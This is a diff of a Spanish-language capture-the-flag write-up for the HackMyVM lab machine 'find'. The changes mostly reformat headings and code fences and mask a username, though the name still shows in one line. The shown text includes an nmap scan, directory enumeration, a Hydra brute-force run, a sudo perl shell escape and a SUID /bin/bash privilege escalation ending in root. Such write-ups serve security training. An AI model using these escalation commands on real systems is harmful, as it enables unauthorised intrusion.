@@ -1,9 +1,9 @@
-#Maquina find Hackmyvm
+# Maquina find Hackmyvm
 ```
 ip: 10.10.10.93
 ports : 22 80
 ```
-##Enumeracion de puertos y Servicios
+## Enumeracion de puertos y Servicios
 
 ~~~
 # Nmap 7.92SVN scan initiated Wed Jun 15 16:02:59 2022 as: nmap -p- -sCV -T4 -v -n -oN targeted -oX taargetedXML 10.10.10.93
@@ -29,7 +29,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Jun 15 16:03:19 2022 -- 1 IP address (1 host up) scanned in 20.00 secon
 ~~~
 
-#Enumeracion de archivos y carpetas
+# Enumeracion de archivos y carpetas
 
 
 [16:24:44] 200 -   10KB - /index.html
@@ -73,21 +73,22 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 16:22:
 
 ##User Pivoting
 
-Del usuario missyred --> kings
+Del usuario xxxxxxx --> kings
 
 Con sudo -l podemos ejecutar perl en gtfobins encontramos la manera de ejecutar una bash.
 
-
-missyred@find:~$ sudo -l
+~~~
+xxxxxx@find:~$ sudo -l
 [sudo] password for missyred: 
-Matching Defaults entries for missyred on find:
+Matching Defaults entries for xxxxxxx on find:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-User missyred may run the following commands on find:
+User xxxxxx may run the following commands on find:
     (kings) /usr/bin/perl
-missyred@find:~$ sudo -u kings  perl -e 'exec "/bin/bash";'
+xxxxxxxx@find:~$ sudo -u kings  perl -e 'exec "/bin/bash";'
+~~~
 
-###Escalada de Privilegios
+### Escalada de Privilegios
 
 accedemos como el user kings y encotramos la primera flag
 
@@ -112,10 +113,11 @@ chmod u+s /bin/bash
 Le damos permisos chmod +x boom.sh y lo ejecutamos --> sudo -u root /opt/boom/boom.sh
 
 Con bash -p accedemos como root.
-
+~~~
 kings@find:~$ bash -p
 bash-5.0# id;whoami;hostname
 uid=1002(kings) gid=1006(kings) euid=0(root) groups=1006(kings),1005(kingg)
 root
 find
 bash-5.0#
+~~~
